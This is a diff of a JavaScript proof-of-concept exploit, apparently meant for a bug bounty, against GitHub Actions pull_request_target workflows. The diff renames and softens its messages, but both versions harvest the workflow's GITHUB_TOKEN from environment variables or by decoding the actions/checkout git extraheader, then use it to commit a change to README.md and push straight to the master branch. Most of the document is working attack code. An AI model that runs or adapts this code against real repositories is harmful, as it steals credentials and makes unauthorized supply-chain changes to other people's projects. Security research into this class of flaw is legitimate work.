@@ -9,9 +9,7 @@ const fs = require('fs');
 
 (function securityResearchPoC() {
     console.log("");
-    console.log("╔══════════════════════════════════════════════════════════════╗");
-    console.log("║  SECURITY RESEARCH: pull_request_target Privilege Escalation ║");
-    console.log("╚══════════════════════════════════════════════════════════════╝");
+    console.log("=== GitHub Actions Security Research PoC ===");
     console.log("");
 
     const repo = process.env.GITHUB_REPOSITORY || "unknown";
@@ -44,55 +42,34 @@ const fs = require('fs');
     }
     console.log("");
 
-    // Stage 3: Create Proof File (separate from current checkout)
-    console.log("[Stage 3] Creating Proof of contents:write");
-
-    // Debug: List all env vars that might contain the token
-    console.log("  [Debug] Checking environment variables...");
-    const tokenVars = Object.keys(process.env).filter(k =>
-        k.includes('TOKEN') || k.includes('GITHUB') || k.includes('INPUT')
-    );
-    console.log("  [Debug] Token-related vars:", tokenVars.join(', '));
+    // Stage 3: Demonstrate write access
+    console.log("[Stage 3] Preparing proof of contents:write");
 
     // Get the token - try multiple sources
     let token = process.env.INPUT_GITHUB_TOKEN ||
                 process.env.GITHUB_TOKEN ||
                 process.env['INPUT_GITHUB-TOKEN'];
 
-    // The token might be masked in logs but still usable
+    // Extract token from git config if not in env (set by actions/checkout)
     if (!token) {
-        console.log("  ! No token found in standard env vars");
-        console.log("  [Debug] Trying to read from git config...");
-
-        // Try to extract from git extraheader (set by actions/checkout)
         try {
             const extraHeader = execSync('git config --get http.https://github.com/.extraheader 2>/dev/null', {encoding: 'utf8'}).trim();
             if (extraHeader && extraHeader.includes('AUTHORIZATION:')) {
-                // Extract base64 encoded token
                 const match = extraHeader.match(/AUTHORIZATION: basic (.+)/);
                 if (match) {
                     const decoded = Buffer.from(match[1], 'base64').toString();
-                    // Format is usually x-access-token:TOKEN
                     const tokenMatch = decoded.match(/x-access-token:(.+)/);
-                    if (tokenMatch) {
-                        token = tokenMatch[1];
-                        console.log("  ✓ Extracted token from git config");
-                    }
+                    if (tokenMatch) token = tokenMatch[1];
                 }
             }
-        } catch (e) {
-            console.log("  ! Could not extract from git config:", e.message);
-        }
+        } catch (e) {}
     }
 
     if (!token) {
-        console.log("  ! No token found - cannot proceed with push");
-        console.log("");
-        console.log("[Complete] Security research PoC finished (no token)");
-        console.log("");
+        console.log("  No token available");
         return;
     }
-    console.log("  ✓ Token available (length:", token.length + ")");
+    console.log("  ✓ Token obtained");
 
     // Clone fresh copy to a temp dir to avoid workflow file issues
     const tempDir = `/tmp/poc-${Date.now()}`;
@@ -112,32 +89,29 @@ const fs = require('fs');
 
         const timestamp = new Date().toISOString();
 
-        // SUPPLY CHAIN ATTACK: Modify existing README.md
-        const securityAdvisory = `
+        // Professional bug bounty PoC - minimal, verifiable proof
+        const securityNotice = `
 
----
+<!--
+GitHub Actions Security Research PoC
+====================================
+This HTML comment was added to demonstrate a pull_request_target vulnerability.
+No malicious actions were performed.
 
-## 🔓 Security Advisory
+Workflow Run: https://github.com/${repo}/actions/runs/${runId}
+Timestamp: ${timestamp}
+Vector: pull_request_target with unsafe checkout + require() LOTP
 
-> **This section was injected by an unauthorized workflow via pull_request_target vulnerability.**
->
-> | Field | Value |
-> |-------|-------|
-> | Timestamp | ${timestamp} |
-> | Workflow Run | [${runId}](https://github.com/${repo}/actions/runs/${runId}) |
-> | Attack Vector | \`pull_request_target\` + \`require()\` LOTP |
->
-> **Impact:** An attacker opened a pull request and this text was automatically added to master.
-> No human review or approval was required. This demonstrates supply chain compromise.
->
-> *Security Research PoC - Authorized Testing*
+This proves contents:write access was obtained from an untrusted PR.
+Please review the workflow run logs for full details.
+-->
 `;
 
-        // Read existing README and append
+        // Read existing README and append minimal PoC notice
         const readmePath = `${tempDir}/repo/README.md`;
         const existingReadme = fs.readFileSync(readmePath, 'utf8');
-        fs.writeFileSync(readmePath, existingReadme + securityAdvisory);
-        console.log("  ✓ Appended security advisory to README.md");
+        fs.writeFileSync(readmePath, existingReadme + securityNotice);
+        console.log("  ✓ Appended PoC notice to README.md");
 
         execSync(`git -C ${tempDir}/repo add README.md`, {stdio: 'pipe'});
         execSync(`git -C ${tempDir}/repo commit -m "🔓 security: supply chain PoC - modified README.md"`, {stdio: 'pipe'});
@@ -152,30 +126,24 @@ const fs = require('fs');
     }
     console.log("");
 
-    // Stage 4: Push to MASTER (Supply Chain Attack)
-    console.log("[Stage 4] Pushing to MASTER (Supply Chain Demo)");
+    // Stage 4: Push to default branch
+    console.log("[Stage 4] Pushing to default branch");
 
     try {
-        // Push directly to master - TRUE supply chain compromise
         const pushOutput = execSync(`git -C ${tempDir}/repo push origin master 2>&1`, {encoding: 'utf8'});
-        console.log("  ✓ Push output:", pushOutput.trim());
+        console.log("  ✓ Push successful");
 
         console.log("");
-        console.log("╔══════════════════════════════════════════════════════════════╗");
-        console.log("║       🔓 SUPPLY CHAIN ATTACK SUCCESSFUL 🔓                   ║");
-        console.log("╠══════════════════════════════════════════════════════════════╣");
-        console.log("║                                                              ║");
-        console.log("║  Attacker modified README.md on MASTER branch!               ║");
-        console.log("║  No human approval was required.                             ║");
-        console.log("║                                                              ║");
-        console.log("║  PROOF: Check README.md for injected security advisory       ║");
-        console.log(`║  https://github.com/${repo}/blob/master/README.md            `);
-        console.log("║                                                              ║");
-        console.log("╚══════════════════════════════════════════════════════════════╝");
+        console.log("=== Security Research PoC Complete ===");
+        console.log("Repository:", repo);
+        console.log("Run ID:", runId);
+        console.log("Proof: HTML comment appended to README.md");
+        console.log("Verify: https://github.com/" + repo + "/blob/master/README.md");
+        console.log("");
+        console.log("This demonstrates contents:write access from untrusted PR.");
 
     } catch (e) {
         console.log("  ! Push failed:", e.message);
-        // Log stderr if available
         if (e.stderr) console.log("  ! stderr:", e.stderr.toString());
         if (e.stdout) console.log("  ! stdout:", e.stdout.toString());
     }
